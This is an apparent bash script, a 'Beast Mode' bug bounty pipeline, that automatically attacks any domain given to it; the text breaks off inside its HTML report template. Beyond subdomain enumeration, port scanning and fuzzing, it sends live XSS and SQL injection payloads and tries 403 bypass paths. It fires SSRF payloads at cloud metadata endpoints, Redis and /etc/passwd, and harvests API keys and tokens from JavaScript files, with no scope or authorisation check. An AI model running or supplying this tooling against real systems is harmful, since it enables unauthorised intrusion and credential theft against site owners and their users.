#!/bin/bash
# ============================================================
#  BEAST MODE — FULL AUTO BUG BOUNTY PIPELINE v2.0
#  Usage: ./bugbounty_beast.sh <domain> [--discord <webhook>] [--telegram <token> <chatid>]
#  Example: ./bugbounty_beast.sh example.com
#           ./bugbounty_beast.sh example.com --discord https://discord.com/api/webhooks/xxx
#           ./bugbounty_beast.sh example.com --telegram BOT_TOKEN CHAT_ID
# ============================================================

set -uo pipefail

# ── Colors ───────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'; NC='\033[0m'

banner() { echo -e "\n${CYAN}${BOLD}╔══ $1 ══╗${NC}"; }
ok()     { echo -e "  ${GREEN}✓${NC} $1"; }
warn()   { echo -e "  ${YELLOW}⚠${NC}  $1"; }
fail()   { echo -e "  ${RED}✗${NC} $1"; }
found()  { echo -e "  ${MAGENTA}${BOLD}★ FOUND:${NC} $1"; }
sep()    { echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"; }

# ── Args ─────────────────────────────────────────────────────
if [[ $# -lt 1 ]]; then
  echo -e "${RED}Usage: $0 <target_domain> [--discord <webhook_url>] [--telegram <token> <chatid>]${NC}"
  exit 1
fi

TARGET="$1"
shift

DISCORD_WEBHOOK=""
TELEGRAM_TOKEN=""
TELEGRAM_CHAT=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --discord)   DISCORD_WEBHOOK="$2"; shift 2 ;;
    --telegram)  TELEGRAM_TOKEN="$2"; TELEGRAM_CHAT="$3"; shift 3 ;;
    *) shift ;;
  esac
done

BASE_DIR="$HOME/bugbounty"
OUT="$BASE_DIR/$TARGET/$(date +%Y%m%d_%H%M%S)"
START_TIME=$(date +%s)

mkdir -p "$OUT"/{recon,subs,live,vuln,fuzzing,screenshots,reports,xss,sqli,ssrf,js}

WORDLIST_DIR="/usr/share/seclists"
WORDLIST_SMALL="/usr/share/wordlists/dirb/common.txt"
[[ -f "$WORDLIST_DIR/Discovery/Web-Content/common.txt" ]] && WORDLIST_SMALL="$WORDLIST_DIR/Discovery/Web-Content/common.txt"

SUBS_ALL="$OUT/subs/all_subs.txt"
LIVE_URLS="$OUT/live/live_urls.txt"
LIVE_HOSTS="$OUT/live/live_hosts.txt"
NUCLEI_OUT="$OUT/vuln/nuclei_results.txt"
NUCLEI_JSON="$OUT/vuln/nuclei_results.jsonl"
> "$SUBS_ALL"

# ── Notify helpers ────────────────────────────────────────────
notify_discord() {
  local msg="$1"
  [[ -z "$DISCORD_WEBHOOK" ]] && return
  curl -s -X POST "$DISCORD_WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"content\": \"🔍 **[$TARGET]** $msg\"}" &>/dev/null || true
}

notify_telegram() {
  local msg="$1"
  [[ -z "$TELEGRAM_TOKEN" || -z "$TELEGRAM_CHAT" ]] && return
  curl -s "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
    -d "chat_id=${TELEGRAM_CHAT}" \
    -d "text=🔍 [${TARGET}] ${msg}" \
    -d "parse_mode=Markdown" &>/dev/null || true
}

notify() {
  local msg="$1"
  notify_discord "$msg"
  notify_telegram "$msg"
}

# ── Tool check ───────────────────────────────────────────────
banner "BEAST MODE INITIALIZING"
echo -e "  Target: ${BOLD}$TARGET${NC}"
echo -e "  Output: ${BOLD}$OUT${NC}"
echo -e "  Time:   ${BOLD}$(date)${NC}"
sep

notify "🚀 Scan started on \`$TARGET\`"

TOOLS=(subfinder httpx nuclei ffuf amass nmap curl jq gowitness dalfox)
MISSING=()
for tool in "${TOOLS[@]}"; do
  command -v "$tool" &>/dev/null && ok "$tool" || { warn "$tool missing"; MISSING+=("$tool"); }
done
[[ ${#MISSING[@]} -gt 0 ]] && warn "Missing tools won't run: ${MISSING[*]}"
sep

# ═════════════════════════════════════════════════════════════
# PHASE 1 — SUBDOMAIN ENUMERATION
# ═════════════════════════════════════════════════════════════
banner "PHASE 1 — Subdomain Enumeration"

# Subfinder
if command -v subfinder &>/dev/null; then
  subfinder -d "$TARGET" -silent -o "$OUT/subs/subfinder.txt" 2>/dev/null || true
  cat "$OUT/subs/subfinder.txt" >> "$SUBS_ALL" 2>/dev/null || true
  ok "Subfinder: $(wc -l < "$OUT/subs/subfinder.txt" 2>/dev/null || echo 0) subs"
fi

# Amass
if command -v amass &>/dev/null; then
  timeout 120 amass enum -passive -d "$TARGET" -o "$OUT/subs/amass.txt" 2>/dev/null || true
  cat "$OUT/subs/amass.txt" >> "$SUBS_ALL" 2>/dev/null || true
  ok "Amass: $(wc -l < "$OUT/subs/amass.txt" 2>/dev/null || echo 0) subs"
fi

# crt.sh
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null \
  | jq -r '.[].name_value' 2>/dev/null \
  | sed 's/\*\.//g' | sort -u > "$OUT/subs/crtsh.txt" || true
cat "$OUT/subs/crtsh.txt" >> "$SUBS_ALL" 2>/dev/null || true
ok "crt.sh: $(wc -l < "$OUT/subs/crtsh.txt" 2>/dev/null || echo 0) subs"

# Waybackurls for extra subs
if command -v waybackurls &>/dev/null; then
  echo "$TARGET" | waybackurls 2>/dev/null \
    | grep -oP '(?<=://)[^/]+' | grep "$TARGET" \
    >> "$SUBS_ALL" || true
fi

sort -u "$SUBS_ALL" -o "$SUBS_ALL"
TOTAL_SUBS=$(wc -l < "$SUBS_ALL")
ok "Total unique subdomains: $TOTAL_SUBS"
notify "📡 Phase 1 done — *$TOTAL_SUBS subdomains* found"
sep

# ═════════════════════════════════════════════════════════════
# PHASE 2 — LIVE HOST PROBING
# ═════════════════════════════════════════════════════════════
banner "PHASE 2 — Live Host Probing"

if command -v httpx &>/dev/null; then
  httpx -l "$SUBS_ALL" \
    -silent \
    -status-code \
    -title \
    -tech-detect \
    -content-length \
    -follow-redirects \
    -threads 50 \
    -o "$OUT/live/httpx_full.txt" 2>/dev/null || true

  awk '{print $1}' "$OUT/live/httpx_full.txt" > "$LIVE_URLS" 2>/dev/null || true
  sed 's|https\?://||' "$LIVE_URLS" | cut -d/ -f1 > "$LIVE_HOSTS" 2>/dev/null || true

  grep " \[200\]" "$OUT/live/httpx_full.txt" > "$OUT/live/live_200.txt" 2>/dev/null || true
  grep " \[403\]" "$OUT/live/httpx_full.txt" > "$OUT/live/403_bypass_candidates.txt" 2>/dev/null || true
  grep " \[401\]" "$OUT/live/httpx_full.txt" > "$OUT/live/401_auth_endpoints.txt" 2>/dev/null || true

  LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
  ok "Live hosts: $LIVE_COUNT"
  notify "🌐 Phase 2 done — *$LIVE_COUNT live hosts* found"
else
  sed "s|^|https://|" "$SUBS_ALL" > "$LIVE_URLS"
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 3 — SCREENSHOTS (gowitness)
# ═════════════════════════════════════════════════════════════
banner "PHASE 3 — Screenshots"

if command -v gowitness &>/dev/null && [[ -f "$LIVE_URLS" ]]; then
  # gowitness v3 uses 'scan file' not 'file'
  gowitness scan file \
    -f "$LIVE_URLS" \
    --screenshot-path "$OUT/screenshots" \
    --timeout 10 \
    --threads 5 \
    2>/dev/null || true
  SHOT_COUNT=$(ls "$OUT/screenshots"/*.png 2>/dev/null | wc -l || echo 0)
  ok "Screenshots taken: $SHOT_COUNT → $OUT/screenshots/"
  notify "📸 Phase 3 done — *$SHOT_COUNT screenshots* captured"
else
  warn "gowitness not found — skipping screenshots"
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 4 — PORT SCAN
# ═════════════════════════════════════════════════════════════
banner "PHASE 4 — Port Scanning"

if command -v nmap &>/dev/null && [[ -f "$LIVE_HOSTS" ]]; then
  head -20 "$LIVE_HOSTS" > "$OUT/recon/nmap_targets.txt"
  nmap -iL "$OUT/recon/nmap_targets.txt" \
    -T3 --top-ports 1000 -sV --open \
    -oN "$OUT/recon/nmap_results.txt" \
    -oX "$OUT/recon/nmap_results.xml" 2>/dev/null || true

  OPEN_PORTS=$(grep -c "^[0-9]" "$OUT/recon/nmap_results.txt" 2>/dev/null || echo 0)
  ok "Nmap done — $OPEN_PORTS open ports found"
  notify "🔌 Phase 4 done — *$OPEN_PORTS open ports* found"
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 5 — URL COLLECTION
# ═════════════════════════════════════════════════════════════
banner "PHASE 5 — Historical URL Collection"

KNOWN_URLS="$OUT/recon/known_urls.txt"
> "$KNOWN_URLS"

curl -s "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=text&fl=original&collapse=urlkey&limit=10000" \
  2>/dev/null >> "$KNOWN_URLS" || warn "Wayback unavailable"

[[ $(command -v waybackurls) ]] && echo "$TARGET" | waybackurls 2>/dev/null >> "$KNOWN_URLS" || true
[[ $(command -v gau) ]] && gau --subs "$TARGET" 2>/dev/null >> "$KNOWN_URLS" || true

sort -u "$KNOWN_URLS" -o "$KNOWN_URLS"
ok "Known URLs: $(wc -l < "$KNOWN_URLS")"

# Extract juicy things
grep -E "\.(js|json|env|config|backup|bak|sql|xml|yaml|yml|log|txt|php|asp|aspx)(\?|$)" \
  "$KNOWN_URLS" > "$OUT/recon/interesting_files.txt" 2>/dev/null || true
grep -iE "(api|admin|login|dashboard|auth|token|secret|key|upload|config|debug|test|dev|staging)" \
  "$KNOWN_URLS" > "$OUT/recon/interesting_endpoints.txt" 2>/dev/null || true

# Extract URLs with parameters (for injection testing)
grep "?" "$KNOWN_URLS" > "$OUT/recon/param_urls.txt" 2>/dev/null || true
ok "URLs with params: $(wc -l < "$OUT/recon/param_urls.txt" 2>/dev/null || echo 0)"
sep

# ═════════════════════════════════════════════════════════════
# PHASE 6 — DIRECTORY FUZZING
# ═════════════════════════════════════════════════════════════
banner "PHASE 6 — Directory & File Fuzzing"

if command -v ffuf &>/dev/null && [[ -f "$LIVE_URLS" ]]; then
  if [[ ! -f "$WORDLIST_SMALL" ]]; then
    cat > "$OUT/fuzzing/mini.txt" << 'WEOF'
admin login api backup config .env wp-admin phpmyadmin upload files
dashboard test dev staging debug hidden secret .git .svn robots.txt
sitemap.xml phpinfo.php server-status server-info .htaccess crossdomain.xml
api/v1 api/v2 graphql swagger swagger-ui.html api-docs
WEOF
    WORDLIST_SMALL="$OUT/fuzzing/mini.txt"
  fi

  head -10 "$LIVE_URLS" | while read -r url; do
    SAFE_NAME=$(echo "$url" | sed 's|https\?://||;s|[/:]|_|g')
    ffuf -u "${url}/FUZZ" \
      -w "$WORDLIST_SMALL" \
      -mc 200,201,204,301,302,401,403 \
      -t 40 -timeout 5 \
      -o "$OUT/fuzzing/ffuf_${SAFE_NAME}.json" \
      -of json -s 2>/dev/null || true
  done

  # 403 bypass attempts
  if [[ -f "$OUT/live/403_bypass_candidates.txt" ]]; then
    ok "Attempting 403 bypasses..."
    awk '{print $1}' "$OUT/live/403_bypass_candidates.txt" | head -20 | while read -r url; do
      path=$(echo "$url" | grep -oP '(?<=://)([^/]+)(/.*)?$' | cut -d/ -f2-)
      host=$(echo "$url" | grep -oP '(?<=://)([^/]+)')
      for bypass in \
        "%2e/$path" "/$path/." "//$path//" "./$path/." \
        "/$path%20" "/$path%09"; do
        resp=$(curl -sk -o /dev/null -w "%{http_code}" "${host}${bypass}" 2>/dev/null || echo "000")
        [[ "$resp" == "200" ]] && found "403 Bypass: ${host}${bypass} → 200" \
          && echo "${host}${bypass}" >> "$OUT/fuzzing/403_bypassed.txt"
      done
    done
  fi

  ok "Fuzzing complete → $OUT/fuzzing/"
  notify "📂 Phase 6 done — Directory fuzzing complete"
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 7 — XSS SCANNING (dalfox)
# ═════════════════════════════════════════════════════════════
banner "PHASE 7 — XSS Scanning"

if command -v dalfox &>/dev/null && [[ -f "$OUT/recon/param_urls.txt" ]]; then
  # Filter to URLs with params only
  head -200 "$OUT/recon/param_urls.txt" > "$OUT/xss/xss_targets.txt"
  URL_COUNT=$(wc -l < "$OUT/xss/xss_targets.txt")
  ok "Testing $URL_COUNT URLs for XSS..."

  dalfox file "$OUT/xss/xss_targets.txt" \
    --silence \
    --no-color \
    --output "$OUT/xss/dalfox_results.txt" \
    --timeout 10 \
    --worker 20 \
    2>/dev/null || true

  XSS_COUNT=$(grep -c "POC" "$OUT/xss/dalfox_results.txt" 2>/dev/null || echo 0)
  ok "XSS findings: $XSS_COUNT"
  [[ "$XSS_COUNT" -gt 0 ]] && {
    found "XSS vulnerabilities: $XSS_COUNT"
    notify "🚨 XSS FOUND — *$XSS_COUNT* XSS vulnerabilities on \`$TARGET\`!"
  }
else
  warn "dalfox not found or no param URLs — manual XSS testing needed"

  # Manual XSS payload test with curl as fallback
  if [[ -f "$OUT/recon/param_urls.txt" ]]; then
    ok "Running basic XSS reflection check with curl..."
    PAYLOAD="<script>alert(BEASTXSS)</script>"
    head -50 "$OUT/recon/param_urls.txt" | while read -r url; do
      param=$(echo "$url" | grep -oP '[?&][^=]+=' | head -1 | tr -d '?&=')
      [[ -z "$param" ]] && continue
      test_url=$(echo "$url" | sed "s/\(${param}=\)[^&]*/\1${PAYLOAD}/")
      resp=$(curl -sk --max-time 5 "$test_url" 2>/dev/null || true)
      echo "$resp" | grep -qF "BEASTXSS" && \
        found "XSS Reflected: $test_url" && \
        echo "$test_url" >> "$OUT/xss/reflected_xss.txt"
    done
  fi
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 8 — SQLi SCANNING
# ═════════════════════════════════════════════════════════════
banner "PHASE 8 — SQL Injection Scanning"

SQLI_TARGETS="$OUT/sqli/targets.txt"
# Filter: only clean param URLs, skip encoded payloads from Wayback
grep "?" "$OUT/recon/param_urls.txt" 2>/dev/null \
  | grep -v "%3F\|%27\|%22\|CAST\|UNION\|SELECT\|SLEEP\|DBMS\|XMLType\|CHR(" \
  | grep -vE "^http.{200,}" \
  | sort -u | head -30 > "$SQLI_TARGETS" || true

if command -v sqlmap &>/dev/null && [[ -s "$SQLI_TARGETS" ]]; then
  ok "Running SQLMap on $(wc -l < "$SQLI_TARGETS") clean URLs..."
  timeout 300 sqlmap -m "$SQLI_TARGETS" \
    --batch \
    --random-agent \
    --level=1 \
    --risk=1 \
    --threads=3 \
    --timeout=10 \
    --retries=1 \
    --output-dir="$OUT/sqli/sqlmap_out" \
    --no-cast \
    2>/dev/null || true
  ok "SQLMap done → $OUT/sqli/sqlmap_out/"
  notify "💉 Phase 8 done — SQLMap scan complete"
else
  warn "sqlmap not found — doing basic error-based SQLi check..."
  SQLI_PAYLOADS=("'" "\"" "1' OR '1'='1" "1 AND 1=1--" "' OR 1=1--")
  SQLI_ERRORS=("sql syntax" "mysql_fetch" "ORA-" "syntax error" "unclosed quotation" "pg_query" "sqlite3")

  head -30 "$SQLI_TARGETS" | while read -r url; do
    for payload in "${SQLI_PAYLOADS[@]}"; do
      test_url=$(echo "$url" | sed "s/=\([^&]*\)/=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}')" 2>/dev/null || echo "$payload")/g")
      resp=$(curl -sk --max-time 5 "$test_url" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)
      for err in "${SQLI_ERRORS[@]}"; do
        if echo "$resp" | grep -q "$err"; then
          found "Possible SQLi error at: $test_url (error: $err)"
          echo "$test_url | $err" >> "$OUT/sqli/potential_sqli.txt"
          notify "🚨 POSSIBLE SQLi — \`$test_url\`"
          break
        fi
      done
    done
  done
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 9 — SSRF SCANNING
# ═════════════════════════════════════════════════════════════
banner "PHASE 9 — SSRF Detection"

# Use interactsh or fallback to known SSRF indicators
SSRF_PAYLOAD_DOMAIN="burpcollaborator.net"  # Replace with your interactsh/Burp collaborator
SSRF_PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://metadata.google.internal/"
  "http://169.254.169.254/metadata/v1/"
  "http://192.168.0.1/"
  "http://localhost/"
  "http://127.0.0.1/"
  "dict://127.0.0.1:6379/info"
  "file:///etc/passwd"
)

SSRF_PARAMS="url|uri|path|dest|redirect|next|ref|return|returnurl|window|host|target|to|link|src|source|data|href|load|fetch|open|continue|domain|callback"

ok "Checking for SSRF-prone parameters..."
grep -iE "(\?|&)(url|uri|path|dest|redirect|src|href|target|fetch|open|data|host|domain|callback)=" \
  "$OUT/recon/param_urls.txt" 2>/dev/null \
  | grep -v "%\|CAST\|SELECT" \
  | head -100 > "$OUT/ssrf/ssrf_candidates.txt" || true

SSRF_CAND=$(wc -l < "$OUT/ssrf/ssrf_candidates.txt" 2>/dev/null || echo 0)
ok "SSRF candidates: $SSRF_CAND"

if [[ "$SSRF_CAND" -gt 0 ]]; then
  head -30 "$OUT/ssrf/ssrf_candidates.txt" | while read -r url; do
    for payload in "${SSRF_PAYLOADS[@]}"; do
      # Use python3 to safely build test URL
      test_url=$(python3 -c "
import urllib.parse, re, sys
url = '$url'
payload = urllib.parse.quote('$payload', safe='')
result = re.sub(r'(url|uri|path|dest|redirect|src|href|target|fetch|open|data|host|domain|callback)=([^&]*)', r'\1=' + payload, url, flags=re.IGNORECASE)
print(result)
" 2>/dev/null || echo "$url")
      resp=$(curl -sk --max-time 5 "$test_url" 2>/dev/null || true)
      if echo "$resp" | grep -qE "(ami-id|instance-id|local-hostname|meta-data|computeMetadata|aws_|gcloud)"; then
        found "SSRF confirmed: $test_url"
        echo "$test_url" >> "$OUT/ssrf/confirmed_ssrf.txt"
        notify "🚨 SSRF CONFIRMED — \`$test_url\`"
      fi
    done
  done
fi
ok "SSRF phase complete → $OUT/ssrf/"
sep

# ═════════════════════════════════════════════════════════════
# PHASE 10 — NUCLEI SCAN
# ═════════════════════════════════════════════════════════════
banner "PHASE 10 — Nuclei Vulnerability Scan"

if command -v nuclei &>/dev/null && [[ -f "$LIVE_URLS" ]]; then
  nuclei -update-templates -silent 2>/dev/null || true

  nuclei -l "$LIVE_URLS" \
    -severity low,medium,high,critical \
    -tags cve,sqli,xss,ssrf,lfi,rce,auth-bypass,exposure,misconfig,default-login,takeover \
    -rl 50 -bulk-size 25 -c 10 -timeout 10 \
    -o "$NUCLEI_OUT" \
    -jsonl "$NUCLEI_JSON" \
    -silent 2>/dev/null || true

  TOTAL_VULNS=$(wc -l < "$NUCLEI_OUT" 2>/dev/null || echo 0)
  CRIT=$(grep -ic "\[critical\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)
  HIGH=$(grep -ic "\[high\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)
  MED=$(grep -ic "\[medium\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)
  LOW=$(grep -ic "\[low\]" "$NUCLEI_OUT" 2>/dev/null || echo 0)

  ok "Nuclei total: $TOTAL_VULNS | Crit: $CRIT | High: $HIGH | Med: $MED | Low: $LOW"
  [[ "$CRIT" -gt 0 || "$HIGH" -gt 0 ]] && \
    notify "🔥 NUCLEI — *$CRIT critical, $HIGH high* severity findings on \`$TARGET\`!"
else
  warn "Nuclei skipped"
  TOTAL_VULNS=0; CRIT=0; HIGH=0; MED=0; LOW=0
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 11 — JS ANALYSIS
# ═════════════════════════════════════════════════════════════
banner "PHASE 11 — JavaScript Analysis"

grep "\.js\b" "$KNOWN_URLS" 2>/dev/null | grep -v "\.json" | sort -u > "$OUT/js/js_files.txt" || true
JS_COUNT=$(wc -l < "$OUT/js/js_files.txt" 2>/dev/null || echo 0)
ok "JS files: $JS_COUNT"

SECRET_PATTERNS='(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token|password|passwd|aws_access|aws_secret|firebase|private[_-]?key|client[_-]?secret|bearer)\s*[=:]\s*["\x27]?[A-Za-z0-9+\/=_\-]{8,}'

if [[ "$JS_COUNT" -gt 0 ]]; then
  head -50 "$OUT/js/js_files.txt" | while read -r jsurl; do
    content=$(curl -sk --max-time 8 "$jsurl" 2>/dev/null || true)
    [[ -z "$content" ]] && continue
    echo "$content" | grep -oiE "$SECRET_PATTERNS" \
      >> "$OUT/js/secrets_found.txt" 2>/dev/null || true
    # Extract endpoints from JS
    echo "$content" | grep -oE '"(/[a-zA-Z0-9/_\-\.]+)"' \
      >> "$OUT/js/js_endpoints.txt" 2>/dev/null || true
  done

  SEC_COUNT=$(wc -l < "$OUT/js/secrets_found.txt" 2>/dev/null || echo 0)
  EP_COUNT=$(sort -u "$OUT/js/js_endpoints.txt" 2>/dev/null | wc -l || echo 0)
  ok "Potential secrets: $SEC_COUNT"
  ok "JS endpoints discovered: $EP_COUNT"
  [[ "$SEC_COUNT" -gt 0 ]] && notify "🔑 JS SECRETS — *$SEC_COUNT potential secrets* found in JS files!"
fi
sep

# ═════════════════════════════════════════════════════════════
# PHASE 12 — HTML REPORT GENERATION
# ═════════════════════════════════════════════════════════════
banner "PHASE 12 — Generating HTML Report"

END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))
LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
TOTAL_SUBS=$(wc -l < "$SUBS_ALL" 2>/dev/null || echo 0)
XSS_COUNT=$(grep -c "POC\|Reflected" "$OUT/xss/dalfox_results.txt" 2>/dev/null || wc -l < "$OUT/xss/reflected_xss.txt" 2>/dev/null || echo 0)
SSRF_COUNT=$(wc -l < "$OUT/ssrf/confirmed_ssrf.txt" 2>/dev/null || echo 0)
SQLI_COUNT=$(wc -l < "$OUT/sqli/potential_sqli.txt" 2>/dev/null || echo 0)
SEC_COUNT=$(wc -l < "$OUT/js/secrets_found.txt" 2>/dev/null || echo 0)
BYPASS_COUNT=$(wc -l < "$OUT/fuzzing/403_bypassed.txt" 2>/dev/null || echo 0)

REPORT_HTML="$OUT/reports/report.html"
NUCLEI_ROWS=""
if [[ -f "$NUCLEI_OUT" ]]; then
  while IFS= read -r line; do
    sev="info"
    echo "$line" | grep -qi "\[critical\]" && sev="critical"
    echo "$line" | grep -qi "\[high\]" && sev="high"
    echo "$line" | grep -qi "\[medium\]" && sev="medium"
    echo "$line" | grep -qi "\[low\]" && sev="low"
    NUCLEI_ROWS+="<tr class='sev-$sev'><td>$(echo "$line" | htmlspecialchars 2>/dev/null || echo "$line")</td></tr>"
  done < "$NUCLEI_OUT"
fi

cat > "$REPORT_HTML" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bug Bounty Report — $TARGET</title>
<style>
  :root {
    --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
    --border: #30363d; --text: #e6edf3; --text2: #8b949e;
    --green: #3fb950; --red: #f85149; --yellow: #d29922;
    --orange: #e3b341; --blue: #58a6ff; --purple: #bc8cff;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: -apple-system, 'Segoe UI', monospace; font-size: 14px; }
  header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 24px 40px; display: flex; align-items: center; gap: 16px; }
  header h1 { font-size: 20px; font-weight: 600; }
  header .target { color: var(--blue); font-size: 14px; font-weight: 400; }
  .container { max-width: 1200px; margin: 0 auto; padding: 32px 40px; }
  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 32px; }
  .stat-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 20px; text-align: center; }
  .stat-card .num { font-size: 32px; font-weight: 700; display: block; }
  .stat-card .label { color: var(--text2); font-size: 12px; margin-top: 4px; }
  .stat-card.crit .num { color: var(--red); }
  .stat-card.high .num { color: var(--orange); }
  .stat-card.med .num { color: var(--yellow); }
  .stat-card.ok .num { color: var(--green); }
  .stat-card.info .num { color: var(--blue); }
  section { margin-bottom: 32px; }
  section h2 { font-size: 16px; font-weight: 600; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 8px; }
  .badge { font-size: 11px; padding: 2px 8px; border-radius: 12px; font-weight: 500; }
  .badge.crit { background: #3d1515; color: var(--red); }
  .badge.high { background: #3d2415; color: var(--orange); }
  .badge.med  { background: #3d3015; color: var(--yellow); }
  .badge.ok   { background: #153d1e; color: var(--green); }
  pre { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 16px; overflow-x: auto; font-size: 12px; line-height: 1.6; white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; }
  table { width: 100%; border-collapse: collapse; background: var(--bg2); border-radius: 8px; overflow: hidden; border: 1px solid var(--border); }
  th { background: var(--bg3); padding: 10px 14px; text-align: left; font-size: 12px; color: var(--text2); font-weight: 500; }
  td { padding: 8px 14px; border-top: 1px solid var(--border); font-size: 13px; font-family: monospace; word-break: break-all; }
  tr.sev-critical td { color: var(--red); }
  tr.sev-high td    { color: var(--orange); }
  tr.sev-medium td  { color: var(--yellow); }
  tr.sev-low td     { color: var(--text2); }
  .progress-bar { background: var(--bg3); border-radius: 4px; height: 6px; margin-top: 4px; }
  .progress-fill { height: 100%; border-radius: 4px; background: var(--blue); }
  .meta { color: var(--text2); font-size: 12px; margin-bottom: 24px; display: flex; gap: 24px; flex-wrap: wrap; }
  .meta span { display: flex; align-items: center; gap: 6px; }
  .empty { color: var(--text2); font-style: italic; padding: 12px; text-align: center; background: var(--bg2); border-radius: 6px; border: 1px solid var(--border); }
  .checklist { list-style: none; padding: 0; }
  .checklist li { padding: 8px 12px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
  .checklist li::before { content: '☐'; color: var(--text2); font-size: 16px; }
  .checklist li:last-child { border-bottom: none; }
</style>
</head>
<body>

<header>
  <div style="font-size:28px">🐉</div>
  <div>
    <h1>Bug Bounty Report <span class="target">$TARGET</span></h1>
    <div style="color:var(--text2);font-size:12px;margin-top:4px">
      Generated: $(date '+%Y-%m-%d %H:%M:%S') · Duration: ${ELAPSED}s · Beast Mode v2.0
    </div>
  </div>
</header>

<div class="container">

  <div class="meta">
    <span>🎯 <strong>Target:</strong> $TARGET</span>
    <span>⏱ <strong>Duration:</strong> ${ELAPSED}s</span>
    <span>📁 <strong>Output:</strong> $OUT</span>
    <span>📅 <strong>Date:</strong> $(date '+%Y-%m-%d')</span>
  </div>

  <!-- STATS -->
  <div class="stats-grid">
    <div class="stat-card info"><span class="num">$TOTAL_SUBS</span><div class="label">Subdomains</div></div>
    <div class="stat-card ok"><span class="num">$LIVE_COUNT</span><div class="label">Live Hosts</div></div>
    <div class="stat-card info"><span class="num">$TOTAL_VULNS</span><div class="label">Nuclei Findings</div></div>
    <div class="stat-card crit"><span class="num">${CRIT:-0}</span><div class="label">Critical</div></div>
    <div class="stat-card high"><span class="num">${HIGH:-0}</span><div class="label">High</div></div>
    <div class="stat-card med"><span class="num">${MED:-0}</span><div class="label">Medium</div></div>
    <div class="stat-card high"><span class="num">$XSS_COUNT</span><div class="label">XSS Found</div></div>
    <div class="stat-card high"><span class="num">$SQLI_COUNT</span><div class="label">SQLi Found</div></div>
    <div class="stat-card crit"><span class="num">$SSRF_COUNT</span><div class="label">SSRF Found</div></div>
    <div class="stat-card med"><span class="num">$SEC_COUNT</span><div class="label">JS Secrets</div></div>
    <div class="stat-card ok"><span class="num">$BYPASS_COUNT</span><div class="label">403 Bypassed</div></div>
  </div>

  <!-- NUCLEI -->
  <section>
    <h2>🎯 Nuclei Findings <span class="badge crit">${CRIT:-0} critical</span> <span class="badge high">${HIGH:-0} high</span></h2>
    $(if [[ "$TOTAL_VULNS" -gt 0 ]]; then
      echo "<table><thead><tr><th>Finding</th></tr></thead><tbody>$NUCLEI_ROWS</tbody></table>"
    else
      echo "<div class='empty'>No nuclei findings</div>"
    fi)
  </section>

  <!-- XSS -->
  <section>
    <h2>⚡ XSS Findings <span class="badge high">$XSS_COUNT found</span></h2>
    <pre>$(cat "$OUT/xss/dalfox_results.txt" 2>/dev/null || cat "$OUT/xss/reflected_xss.txt" 2>/dev/null || echo "No XSS findings")</pre>
  </section>

  <!-- SQLi -->
  <section>
    <h2>💉 SQL Injection <span class="badge crit">$SQLI_COUNT potential</span></h2>
    <pre>$(cat "$OUT/sqli/potential_sqli.txt" 2>/dev/null || echo "No SQLi findings")</pre>
  </section>

  <!-- SSRF -->
  <section>
    <h2>🌐 SSRF Findings <span class="badge crit">$SSRF_COUNT confirmed</span></h2>
    <pre>$(cat "$OUT/ssrf/confirmed_ssrf.txt" 2>/dev/null || echo "No SSRF confirmed")</pre>
  </section>

  <!-- JS Secrets -->
  <section>
    <h2>🔑 JS Secrets <span class="badge med">$SEC_COUNT potential</span></h2>
    <pre>$(head -30 "$OUT/js/secrets_found.txt" 2>/dev/null || echo "No secrets found")</pre>
  </section>

  <!-- 403 Bypass -->
  <section>
    <h2>🔓 403 Bypasses <span class="badge ok">$BYPASS_COUNT found</span></h2>
    <pre>$(cat "$OUT/fuzzing/403_bypassed.txt" 2>/dev/null || echo "No 403 bypasses found")</pre>
  </section>

  <!-- Subdomains -->
  <section>
    <h2>📡 Subdomains <span class="badge ok">$TOTAL_SUBS total</span></h2>
    <pre>$(head -50 "$SUBS_ALL" 2>/dev/null || echo "none")</pre>
  </section>

  <!-- Live Hosts -->
  <section>
    <h2>🌍 Live Hosts <span class="badge ok">$LIVE_COUNT alive</span></h2>
    <pre>$(head -40 "$OUT/live/httpx_full.txt" 2>/dev/null || echo "none")</pre>
  </section>

  <!-- Interesting -->
  <section>
    <h2>🕵️ Interesting Endpoints</h2>
    <pre>$(head -30 "$OUT/recon/interesting_endpoints.txt" 2>/dev/null || echo "none")</pre>
  </section>

  <!-- Port Scan -->
  <section>
    <h2>🔌 Port Scan Results</h2>
